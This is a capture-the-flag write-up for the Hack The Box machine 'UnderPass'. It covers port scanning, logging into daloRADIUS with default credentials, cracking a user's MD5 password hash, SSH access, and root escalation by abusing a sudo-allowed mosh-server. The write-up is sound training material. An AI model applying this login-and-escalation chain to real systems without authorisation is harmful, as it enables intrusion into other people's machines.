---
tags:
  - HTB
  - Linux
  - Easy
  - Brute-Force
  - Sudo
---
https://app.hackthebox.com/machines/UnderPass/
# Add Hosts
Append to the `/etc/hosts` file:
```text
10.10.11.48 UnDerPass.htb
```
# Scanning
```console
$ nmap -p22,80 -sV -sC UnDerPass.htb

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
|_  256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# Enumeration
Discovered login panel at http://underpass.htb/daloradius/app/operators/login.php, successful login with daloRADIUS **default credentials**: `administrator : radius`.
# Cracking MD5
Navigate to [management > list users](http://underpass.htb/daloradius/app/operators/mng-list-all.php) to find **username** `svcMosh` and **MD5 hashed password** `412DD4759978ACFCC81DEAB01B382403`. Using [CrackStation](https://crackstation.net/), the password is `underwaterfriends`. Then, log in via SSH:
```bash
ssh svcMosh@UnDerPass.htb
```
Get **user flag**:
```bash
cat /home/svcMosh/user.txt
```
# Privilege Escalation
Found **sudo executable binaries**:
```console
$ sudo -l

(ALL) NOPASSWD: /usr/bin/mosh-server
```
Escalate privileges by [abusing from mosh-server](https://medium.com/@momo334678/mosh-server-sudo-privilege-escalation-82ef833bb246) binary:
```console
$ sudo /usr/bin/mosh-server
MOSH CONNECT 60001 xtnd2NPxODppSUvI9V2+Mw

$ MOSH_KEY=xtnd2NPxODppSUvI9V2+Mw mosh-client 127.0.0.1 60001
```
Get **root flag**:
```bash
cat /root/root.txt
```